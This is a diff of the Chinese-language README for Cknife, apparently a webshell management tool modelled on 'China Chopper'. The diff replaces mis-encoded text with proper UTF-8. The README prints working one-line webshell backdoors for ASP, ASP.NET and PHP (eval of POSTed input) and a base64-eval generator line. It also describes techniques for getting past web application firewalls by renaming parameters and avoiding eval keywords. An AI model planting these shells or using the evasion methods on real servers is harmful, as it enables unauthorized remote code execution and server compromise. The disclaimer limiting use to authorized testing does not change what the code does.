@@ -1,49 +1,45 @@
-�������ƣ�Cknife
-�������ƣ�C��
-Դ���ַ��https://github.com/Chora10/Cknife
-���ص�ַ��http://pan.baidu.com/s/1nul1mpr  ���룺f65g
-�ٷ����ͣ�http://www.ms509.com/
-���ߣ�	  Chora && MelodyZX
+#Cknife
+软件名称：Cknife
 ----------------------------------------------------------------------------------------------------------
-����������
-�����߽����ڰ�ȫ�о����ѧʹ�ã��û�ʹ�ñ���������ɵ����к�������û��е�ȫ�����ɼ��������Σ����߲��е��κη��ɼ��������Ρ�
+免责声明：
+本工具仅限于安全研究与教学使用，用户使用本工具所造成的所有后果，由用户承担全部法律及连带责任！作者不承担任何法律及连带责任。
 ----------------------------------------------------------------------------------------------------------
-Ϊʲô����Cknife��
-1�������ѱ���Ȩ����͸������Ա������͸���ԣ�
-2������WAF������������WAF�ķ���������
-3���������Ա����������վ����������
+为什么开发Cknife：
+1、方便已被授权的渗透测试人员进行渗透测试；
+2、方便WAF厂商提升自身WAF的防护能力；
+3、方便管理员管理自身网站及服务器。
 ----------------------------------------------------------------------------------------------------------
-Ϊʲô��ԴCknife��
-1����ϴ��ڵ������Ż����Ʊ�������
-2���˵����Ų�������Դ�����ܴ��ڵļල�Լ���ơ�
+为什么开源Cknife：
+1、结合大众的力量优化完善本软件；
+2、菜刀后门层出不穷，开源来接受大众的监督以及审计。
 ----------------------------------------------------------------------------------------------------------
-���룺ϣ�����ڰ�ȫ�о�Ա�Լ�WAF���̵ĶԿ�����������WAF�ķ���ˮƽ�Լ���ȫ�о�Ա��ʵ����
+理想：希望能在安全研究员以及WAF厂商的对抗中提升国内WAF的防护水平以及安全研究员的实力。
 ----------------------------------------------------------------------------------------------------------
 
 
-һ�����л�����
+一、运行环境：
 
-��װ��JRE1.7+���������в���ϵͳ
+安装了JRE1.7+环境的所有操作系统
 
-�����ļ�˵����
+二、文件说明：
 ------------------------------------------------------------------
-Cknife.jar	Cknife������
+Cknife.jar	Cknife主程序
 ------------------------------------------------------------------
-Cknife.db	Cknife�����ݿ�(�����ڻ��Զ�����)
-Config.ini	Cknife�������ļ�(�����ڻ��Զ�����)
-ReadMe.txt	���������ڿ���(��ɾ��)
-1.jsp		JSP����˽ű�(��ɾ��)
-1.jspx		JSPX����˽ű�(��ɾ��)
+Cknife.db	Cknife的数据库(不存在会自动生成)
+Config.ini	Cknife的配置文件(不存在会自动生成)
+ReadMe.txt	你现在正在看的(可删除)
+1.jsp		JSP服务端脚本(可删除)
+1.jspx		JSPX服务端脚本(可删除)
 ------------------------------------------------------------------
 
-����ʹ��˵����
+三、使用说明：
 
-����˽ű�֧��ASP��ASPX��PHP��JSP��JSPX��Customize(�Զ���)��
-��������Ҳ��������´��루ֻҪ�ܹ��������eval�ĺ������У�����PHP��create_function��assert�ȣ�
+服务端脚本支持ASP、ASPX、PHP、JSP、JSPX、Customize(自定义)。
+代码包含且不限于如下代码（只要能构造出类似eval的函数就行，比如PHP的create_function、assert等）
 
 ASP:        
 <%eval request("Cknife")%>
-��	
+　	
 ASP.NET:    
 <%@ Page Language="Jscript"%><%eval(Request.Item["Cknife"],"unsafe");%>
 
@@ -51,69 +47,69 @@ PHP:
 <?php @eval($_POST['Cknife']);?>
 
 JSP:	    
-[�������1.jsp]
+[代码详见1.jsp]
 
 JSPX:	    
-[�������1.jspx]
+[代码详见1.jspx]
 
 Customize:  
-�Զ�������,���ܴ����ڷ���˱���,������֧�����ж�̬�ű�,ֻҪ��ȷ��C�����н������ɡ���ģʽ�ɰ��趨�ƣ�����ֻҪ���Ŀ¼������ֻҪ�����ն˹��ܣ�������Ժܼ�̡�
+自定义类型,功能代码在服务端保存,理论上支持所有动态脚本,只要正确与C刀进行交互即可。此模式可按需定制，比如只要浏览目录，或是只要虚拟终端功能，代码可以很简短。
 
 
-�ġ����ݿ⹦�ܣ�
+四、数据库功能：
 
-�״�ʹ�����б������Ҽ���ѡ�����ݿ��������ʾ�����������ݿ⣬����������ݿⰴťѡ���Ӧ�����ӷ�ʽ���Ӽ��ɡ�
+首次使用在列表里点击右键，选择数据库管理会提示请先配置数据库，点击配置数据库按钮选择对应的连接方式连接即可。
 
-�塢���ù��ܣ�
+五、设置功能：
 
-�������ܣ������ʹ�ѡ��������͡�֧��SOCKS��HTTP���͵Ĵ�����ʹ��BurpץȡCknife���ݣ���ѡ���������ΪHTTP�������϶�Ӧ��IP�Լ��˿ڼ��ɡ�
-�����Ҫ�رմ������ܣ�ֻ��Ҫѡ���������ΪDIRECT����������û��������룬����ʾ�رմ�����
+代理功能：在类型处选择代理类型。支持SOCKS、HTTP类型的代理，使用Burp抓取Cknife数据，需选择代理类型为HTTP，并填上对应的IP以及端口即可。
+如果想要关闭代理功能，只需要选择代理类型为DIRECT，或者清空用户名或密码，即表示关闭代理。
 
-�Զ�������ͷ���ܣ����ı���������Ҫ�Զ��������ͷ�Լ���Ӧ��ֵ���������ӻ��޸Ķ������ͷ��ֻ��Ҫ�������¸�ʽ���Ӽ��ɣ�
+自定义请求头功能：在文本框里输入要自定义的请求头以及对应的值，可以添加或修改多个请求头。只需要按照如下格式添加即可：
 User-Agent:xxx
 Cookie:xxx
 ms509:Chora
-�����Ҫ�ر��Զ�������ͷ���ܣ�ֻ��Ҫ���ı���������գ�����ѡ�йر�ѡ�ȷ����
+如果想要关闭自定义请求头功能，只需要把文本框内容清空，或者选中关闭选项并确定。
 
-������WAF
+六、过WAF
 
-����һ���ƽ̨�Ļ��������ļ����й��˵��������в��������û������壬������ֻ��ͼ�ε�չʾ���Լ����ݵķ��͡�
-�ҷֿ���ÿһ������д�뵽�����ļ����棬�û������Զ����κδ��룬�������Ĳ������ƣ��������ݡ� 
-���磺 
-SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel ����Ƥ��Ϊnimbus 
-SPL=->|               			       ��ʾ��ȡ���ݵĿ�ʼ���� 
-SPR=|<-               			       ��ʾ��ȡ���ݵĽ������� 
-CODE=code         			       ������� 
-ACTION=action    			       �������� 
-PARAM1=z1         			       ����1 
-PARAM2=z2         			       ����2 
-PHP_BASE64=1   				       ��ΪPHPʱ��Z1��Z2�����Ƿ����Զ�base64���ܣ�����붨���Լ��ļ��ܷ�ʽ��ر�����Ϊ0 
-PHP_MAKE=@eval(base64_decode($_POST[action])); ���ɷ�ʽ��������Բ��ø÷�ʽ�����������κ���Ҫ�ķ�ʽ 
-PHP_INDEX=...             		       ��ʾ��ҳ���ܵĴ�������
-PHP_READDICT=...      			       ��ȡ��ҳ���ܵĴ�������
-PHP_READFILE=...       			       ��ȡ�ļ����ܵĴ�������
-PHP_DELETE=...           		       ɾ���ļ����Լ��ļ����ܵĴ�������
-PHP_RENAME=...         			       �������ļ����Լ��ļ����ܵĴ�������
-PHP_RETIME=...         			       �޸�ʱ�书�ܵĴ�������
-PHP_NEWDICT=...        			       �½�Ŀ¼���ܵĴ�������
-PHP_UPLOAD=...          		       �ϴ��ļ����ܵĴ�������
-PHP_DOWNLOAD=...    			       �����ļ����ܵĴ�������
-PHP_SHELL=...              		       �����ն˹��ܵĴ�������
-PHP_DB_MYSQL=...			       ����MYSQL���ݿ⹦�ܵĴ�������
+这是一款跨平台的基于配置文件的中国菜刀，把所有操作给予用户来定义，主程序只是图形的展示，以及数据的发送。
+我分开了每一个步骤写入到配置文件里面，用户可以自定义任何代码，包括更改参数名称，参数内容。 
+比如： 
+SKIN=javax.swing.plaf.nimbus.NimbusLookAndFeel 设置皮肤为nimbus 
+SPL=->|               			       表示截取数据的开始符号 
+SPR=|<-               			       表示截取数据的结束符号 
+CODE=code         			       编码参数 
+ACTION=action    			       动作参数 
+PARAM1=z1         			       参数1 
+PARAM2=z2         			       参数2 
+PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
+PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
+PHP_INDEX=...             		       显示主页功能的代码放这儿
+PHP_READDICT=...      			       读取主页功能的代码放这儿
+PHP_READFILE=...       			       读取文件功能的代码放这儿
+PHP_DELETE=...           		       删除文件夹以及文件功能的代码放这儿
+PHP_RENAME=...         			       重命名文件夹以及文件功能的代码放这儿
+PHP_RETIME=...         			       修改时间功能的代码放这儿
+PHP_NEWDICT=...        			       新建目录功能的代码放这儿
+PHP_UPLOAD=...          		       上传文件功能的代码放这儿
+PHP_DOWNLOAD=...    			       下载文件功能的代码放这儿
+PHP_SHELL=...              		       虚拟终端功能的代码放这儿
+PHP_DB_MYSQL=...			       管理MYSQL数据库功能的代码放这儿
 ASP_...=...
 ASPX_...=...
 JSP_...=...
 
-�����޸����ϲ�����WAF�⣬���򻹶����ṩ��һ��Customize��WAF��ģʽ��
-Customizeģʽԭ��������֧��һЩ����Ĭ�ϲ�֧�ֵĽű�������CFM��ASMX��ASHX��PY�ȵȣ�ֻҪ�û���д�Ľű�����ȷ��˵����н������ɡ�
+除了修改以上参数过WAF外，程序还额外提供了一种Customize过WAF的模式。
+Customize模式原本是用于支持一些程序默认不支持的脚本，比如CFM、ASMX、ASHX、PY等等，只要用户自写的脚本能正确与菜刀进行交互即可。
 
-��һ��˼����ʽ�����������дһ��PHP�ű�ʵ�������ļ��Լ�Ŀ¼�Ĺ��ܣ����ܹ���ȷ����C�����н��������ʱ���������ѡ��PHP(Eval)�����ӷ�ʽ�ͻ�����ʧ�ܡ�
-Ӧ��ѡ��Customizeģʽ�������ӡ�����˵Ϊʲôһ�仰�Ϳ������ӣ���ƫƫ��Ҫд��ô�������Customizeģʽ���ӣ����һ����������WAF���eval,assert�ȹؼ���
-�����һ�仰ʵ�����Ĳ��������ʱ������Բ���һ�仰������PHP�ű�������������ʵ�����ļ��Լ�Ŀ¼��Ȼ����Customizeģʽ���Ӿʹﵽ�˹�WAF��Ŀ�ġ�
+换一个思考方式，如果我们自写一个PHP脚本实现了列文件以及目录的功能，它能够正确的与C刀进行交互，这个时候如果我们选择PHP(Eval)的连接方式就会连接失败。
+应该选择Customize模式进行连接。有人说为什么一句话就可以连接，你偏偏还要写这么多代码用Customize模式连接？如果一个很厉害的WAF检测eval,assert等关键词
+，你的一句话实在是饶不过，这个时候你可以不用一句话，就在PHP脚本里用正常代码实现列文件以及目录，然后用Customize模式连接就达到了过WAF的目的。
 
-Customize(�Զ���)ģʽ������ģʽһ����ÿһ������Ҳ��д�뵽�����ļ����棬�û�ͬ�����Բ��������Լ��������ݡ�
-��������д����Customizeģʽ���ӵ�Customize.php����ˡ���ʾ��ҳ�����ύ�Ĳ���Ӧ���ǣ�����=1&action=index�Լ�����=1&action=readdict��
-���C���ռ��Ժ�WAF���̿϶����readdict��������������ʱ����Ϳ����޸�readdict������Ϊ�������ƣ�ͬ�������޸�action�����ƣ�Ҳ�����޸�1Ϊ�����ַ�
+Customize(自定义)模式跟其他模式一样，每一个步骤也都写入到配置文件里面，用户同样可以参数名称以及参数内容。
+比如你自写了用Customize模式连接的Customize.php服务端。显示主页功能提交的参数应该是：密码=1&action=index以及密码=1&action=readdict。
+如果C刀普及以后WAF厂商肯定会把readdict列入黑名单，这个时候你就可以修改readdict的名称为其他名称，同样可以修改action的名称，也可以修改1为其他字符
 CUS_MAKE=1 
 CUS_INDEX=index 
 CUS_READDICT=readdict 
@@ -127,88 +123,88 @@ CUS_UPLOAD=upload
 CUS_DOWNLOAD=download 
 CUS_SHELL=shell
 
-�ߡ�������־��(���°汾����ɾ��Config.ini�ļ������´��Զ������°汾��Config.ini)
+七、更新日志：(更新版本后请删除Config.ini文件，重新打开自动生成新版本的Config.ini)
 
-������ʹ�ù����������и���BUG����ʱ��ע��һ���Ƿ��и��°ɣ�˵���������޲����ء�
+程序在使用过程中难免有各种BUG，及时关注看一下是否有更新吧，说不定己经修补了呢。
 
-��֪���⣺
-Graphite��Metal���͵�Ƥ������֮���л�����Ҫ����Cknife����������(Nimbus��Windows��Mac��)��Ƥ���໥֮���л�Ҳ����Ҫ����Cknife��
-�������������͵�Ƥ�������л�����Ҫ����Cknife������ȫ��Ч����Ȼ��С������󻯡��رհ�ť������ʾ������Swing�ܹ����������⡣
+已知问题：
+Graphite与Metal类型的皮肤互相之间切换不需要重启Cknife，其余类型(Nimbus、Windows、Mac等)的皮肤相互之间切换也不需要重启Cknife，
+但是这两种类型的皮肤进行切换就需要重启Cknife才能完全生效，不然最小化、最大化、关闭按钮不会显示，这是Swing架构遗留的问题。
 
 20160729
-1���ļ������޸�����BUG
-2���ļ����������޸�ʱ�书��
-3���ļ������Ż�����
+1、文件管理修复若干BUG
+2、文件管理新增修改时间功能
+3、文件管理优化界面
 
 20160728
-1�����ݿ�����޸�����BUG
-2�����ݿ�������ӻ�ȡ������
-3�����ݿ�����Ż�����
+1、数据库管理修复若干BUG
+2、数据库管理增加获取表行数
+3、数据库管理优化界面
 
 20160623
-1�������ն������Ҽ�����ճ�����ܣ���ݼ�Ctrl+C��Ctrl+V��
-2�������ն������ϼ��¼��л���ʷ�����
-3�����ݿ���������Ҽ��������ݹ���
+1、虚拟终端增加右键复制粘贴功能（快捷键Ctrl+C、Ctrl+V）
+2、虚拟终端增加上键下键切换历史命令功能
+3、数据库管理增加右键导出数据功能
 
 20160622
-1���޸�ORACLE���ݿ�����ʧ�ܵ�����
-2���޸���ĳ�ֱ���������SHELL�Ի�����������ı�����ʧ������
-3������JSPX�ű�
+1、修复ORACLE数据库连接失败的问题
+2、修复在某分辨率下添加SHELL对话框里的密码文本框消失的问题
+3、更新JSPX脚本
 
 20160620
-1���޸������ն˵͸���ִ��ʧ�ܵ����
-2�����ݿ���������Ż�
+1、修复虚拟终端低概率执行失败的情况
+2、数据库管理界面优化
 
 20160618
-1�����Ӷ�HTTPSЭ���֧��
-2���޸��ļ������ұ����������벻��ʾ�����
+1、添加对HTTPS协议的支持
+2、修复文件管理右边栏遇到乱码不显示的情况
 
 20160513
-1�������Զ�������ͷ����
+1、添加自定义请求头功能
 
 20160511
-1����������ѡ������˴�������
-2�������˶�JSPX�ű���֧�֣�����ʱ�ű�����ѡ��JSP(Eval)
+1、添加设置选项并增加了代理功能
+2、增加了对JSPX脚本的支持，连接时脚本类型选择JSP(Eval)
 
 20160426
-1���޸�JSP����MYSQL���ݿ��쳣������
-2�������ն������Զ���Cmd·���Ĺ��ܣ�����Ϊsetp [path]
+1、修复JSP连接MYSQL数据库异常的问题
+2、虚拟终端增加自定义Cmd路径的功能，命令为setp [path]
 
 20160413
-1�������Զ���ģʽshell����·�����Զ���ָ���
-2������JSP��MSSQL��֧��
+1、添加自定义模式shell返回路径的自定义分隔符
+2、添加JSP对MSSQL的支持
 
 20160318
-1���Ż����棬�ұ������Ŀ¼�������Ҳ��ѡ��
-2���޸�ASP��ASPX��JSP�ڴ򿪿�Ŀ¼ʱ��ʧ�ܵ�����
-3����Ĭ��Ƥ��Graphite���ӵ�Ƥ���л�����
-4�������ն����ӱ�ʶ�������û��ֱ�
-5�����ݿⲿ�ֹ������Ӷ��߳�
+1、优化界面，右边栏点击目录后左边栏也会选中
+2、修复ASP、ASPX、JSP在打开空目录时会失败的问题
+3、将默认皮肤Graphite添加到皮肤切换功能
+4、虚拟终端增加标识符方便用户分辨
+5、数据库部分功能增加多线程
 
 20160317
-1���Ż��ļ�����������Ĵ򿪷�ʽ
-2���ļ��������й���ʹ�ö��̣߳���ֹ���ӳ��������Ῠ���������
+1、优化文件管理左边栏的打开方式
+2、文件管理所有功能使用多线程，防止高延迟请求界面会卡的情况发生
 
 20160316
-1���޸���Linux��Ĭ��Ƥ����ʾ���������
-2������ASPX��MSSQL��ACCESS��֧��
-3������Ƥ�����ѡ�к󿴲�������
+1、修复在Linux下默认皮肤显示乱码的问题
+2、添加ASPX对MSSQL、ACCESS的支持
+3、更换皮肤解决选中后看不清的情况
 
 20160314
-1������ASP��MSSQL��ACCESS��֧��
-2���޸�����·������ʧ�ܵ�����
+1、添加ASP对MSSQL、ACCESS的支持
+2、修复中文路径启动失败的问题
 
 20160311
-1���޸�ģ���ն�����BUG��
-2��ģ���ն�ʹ�ö��̣߳���ֹ���ӳ��������Ῠ���������
+1、修复模拟终端若干BUG；
+2、模拟终端使用多线程，防止高延迟请求界面会卡的情况发生
 
 20160310
-1������JSP��MYSQL��ORACLE��֧��
-2���޸���Windows�£��ļ���������һ���̷�
+1、添加JSP对MYSQL、ORACLE的支持
+2、修复在Windows下，文件管理会多出一个盘符
 
 20160307
-1������ʧ�ܷ�����ϸ��Ϣ�������û���������
+1、连接失败返回详细信息，方便用户分析问题
 
 20160301
-1���ϲ�Cknife��Cknife_Skin
-2���������ݿ⹦�ܣ�����PHP��MYSQL��֧��
+1、合并Cknife与Cknife_Skin
+2、添加数据库功能，添加PHP对MYSQL的支持
